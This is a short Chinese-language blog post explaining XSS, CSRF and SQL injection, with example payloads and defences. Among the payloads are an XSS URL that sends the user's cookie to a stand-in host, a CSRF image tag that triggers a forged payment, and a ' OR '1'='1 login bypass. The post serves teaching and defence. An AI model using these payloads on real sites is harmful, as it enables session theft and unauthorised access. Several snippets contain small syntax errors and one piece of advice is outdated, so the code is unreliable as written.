---
title: 前端安全问题初探
date: 2017-09-30 07:42:03
tags: 前端
---
一直在前端安全方面没什么了解，曾经也遇到过某些安全问题，但没怎么去了解，只是简单的处理了问题；现在简单的学习一下关于前端安全的一些问题。

<!-- more -->

### 一、XSS
XSS（Cross-site scripting，其实应该简称CSS，不过重名了。尴尬）称为跨站脚本。
维基百科解释：XSS是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。

XSS的大名估计很多人都知道，我也只是听说而已，一直以来不怎么了解他是如何工作的，也不太清楚他的危害。有一天得到后端人员的日志记录，发现了某些人测试我们网页的url，我才有所理解。
```
http://www.xxxx.com?id="><script>alert("xxxx")<script>
```
之前又把id渲染到页面上使用的习惯，比如如下代码:
```
<input id="id" type="hidden" value="{$id}"/>
```
如果后端没有进行过滤等处理的话，这时候展示出来的代码就是
```
<input id="id" type="hidden" value=""><script>alert("xxxx")<script>"/>
```
用户如果点击了上述的url，可能就会被他人恶意获取信息，比如说:

```
http://www.xxxx.com?id="><script>window.open="http://www.yyyy.com?co="+document.cookie<script>
```
或者是去个什么小网站也是可以的:
```
http://www.xxxx.com?id="><script>window.location="http://www.xiaowangzhan.com"<script>
```
当然这种攻击的范围都较小，需要某个用户点击特定的链接才行。还有一种情况是在上传内容时加入脚本，如果没有进行过滤等处理，所有查看文章的人都会受到影响，这种方式波及的范围较大。

#### 防范方式：

 - 前端尽量避免输出query参数
 - 后端参数过滤和编码处理

### 二、CSRF
CSRF（Cross-site request forgery）称为跨站请求伪造。
维基百科解释： 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。 跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。

一个简单的栗子，比如A用户登录了xx银行的网站，然后访问了M网站，M网站内被放入了一个图片

```
<img src="http://www.xx.com/payamount=100&for=attacker"/>
```
这是攻击者就利用A用户未过期的身份信息进行了支付处理。当然这是一种理想情况，银行不会这么简单就让你支付的。不过伪造用户进行访问还是会带来很大的危害，比如删除用户的内容，获取用户隐私内容等等。

#### 防范方式:

 - Referer验证
 - token校验

### 三、SQL注入
维基百科:SQL攻击（SQL injection），简称注入攻击，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏或是入侵。

举个栗子：
某个网站的登录验证的SQL查询代码为
```
sqlStr = "SELECT * FROM user WHERE (username = '" + userName + "') and (password = '"+ passWord +"');"
```
用户名填写
```
userName = "jack'
```
密码填写

```
passWord = "1' OR '1'='1";
```
导致原本的SQL字符串
```
sqlStr = "SELECT * FROM users WHERE (username = 'jack') and (password = '1' OR '1'='1');"
```
也就是实际上运行的SQL命令会变成下面这样的
```
sqlStr = "SELECT * FROM users WHERE (username = 'jack');"
```
我就可以使用jack的账号登录了。

数据库注入攻击的危害很大，可能导致用户信息被盗，丢失等问题。
#### 防范方式（参考维基百科）:

 - 在设计应用程序时，完全使用参数化查询（Parameterized Query）来设计数据访问功能。
 - 在组合SQL字符串时，先针对所传入的参数作字符取代（将单引号字符取代为连续2个单引号字符）。
 - 如果使用PHP开发网页程序的话，亦可打开PHP的魔术引号（Magic
   quote）功能（自动将所有的网页传入参数，将单引号字符取代为连续2个单引号字符）。


over...